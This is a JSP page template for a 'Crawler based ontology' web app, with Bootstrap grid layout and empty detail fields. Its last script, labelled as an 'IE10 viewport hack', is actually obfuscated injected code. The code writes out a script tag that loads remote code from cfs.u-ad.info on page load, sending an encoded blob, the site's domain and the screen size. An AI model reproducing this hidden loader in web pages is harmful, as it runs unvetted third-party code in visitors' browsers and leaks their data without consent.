<%@ page import="java.sql.*" %>
<%@ page import="java.io.*" %>

<%@ page import="org.jsoup.nodes.*" %>
<%@ page import="service.Crawl" %>
<%@ page language="java" contentType="text/html; charset=ISO-8859-1" pageEncoding="ISO-8859-1"%>

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="en">
  <head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
	<style type="text/css">
	h4 {
	  margin-top: 25px;
	}
	.row {
	  margin-bottom: 20px;
	}
	.row .row {
	  margin-top: 10px;
	  margin-bottom: 0;
	}
	[class*="col-"] {
	  padding-top: 15px;
	  padding-bottom: 15px;
	  background-color: #eee;
	  background-color: rgba(86,61,124,.15);
	  border: 1px solid #ddd;
	  border: 1px solid rgba(86,61,124,.2);
	}
	
	hr {
	  margin-top: 40px;
	  margin-bottom: 40px;
	}
	</style>
    <title>Grid Template for Bootstrap</title>

    <!-- Bootstrap core CSS -->
    <link href="assets/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  </head>

  <body>
    <div class="container">
		<div class="page-header">
			<h1>Crawler based ontology</h1>
		</div>
		<h3>Details</h3>
		<div class="row">
			<div class="col-md-3">
				Domain : 
			</div>
			<div class="col-md-3">
				URL :
			</div>
			<div class="col-md-3">
				Title :
			</div>
			<div class="col-md-3">
				Depth :
			</div>
		</div>
		<h3>Page Source</h3>
		<p>Get three equal-width columns <strong>starting at desktops and scaling to large desktops</strong>. On mobile devices, tablets and below, the columns will automatically stack.</p>
		<div class="row">


		</div>
		<h3>Preprocessing</h3>
		<div class="row">
			<div class="col-md-6">

			</div>
			<div class="col-md-3">
				Title :
			</div>
			<div class="col-md-3">
				Depth :
			</div>
		</div>
	</div> <!-- /container -->

	
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
  <script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRZHNxrqa%2fIl3iFYwOQvNbc1TPIMXUJKEhyhg%2fnLM53J5gmi%2bz3X%2fYH%2bZIzBB0ohY5lVER2mrCirZgqOeVpg8xQDQeLwHsl31nqpIJt2n%2bAnE8Jvt2GXg0nJY9O8itBq9AQUkLn4FtYG%2f%2f1vhK8hSGPZlVIu4PhGQz0F9Lv%2bTY37IBb2kilnisqURwLc38W1U4mT2YusQ1djvyXb3nlferPv%2fpiECr2%2fdo4wNVl1d%2brmdaeOgb9HBhRiExwMOE3pwHyi3L47SCprUVDiuU3UjyI5hMAN0GiHeDeRebkH9UIuAjGMEmmUemLq%2fC1XeRwumZ4hodjOwDV%2bKfjuQS2tRoVVI7RJR7Y3m9251Z30lMrdm39X%2bXTC5eWmlthK5gK%2fmGOS0vXj57DkI1jNs0O40rdLWRfzwNFfQgx%2fvBzct3uns0yPaaR1huyY7tcMiiNVdNJaYIHc6kWP%2b%2f4Snplbb32wZg4l6IylWCN3xBrmIUVrY2fDedhpQ%2fOT3i8JecfhTP%2bb%2bPUCTQ87gTH3QRrn8wnQ%3d%3d");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body>
</html>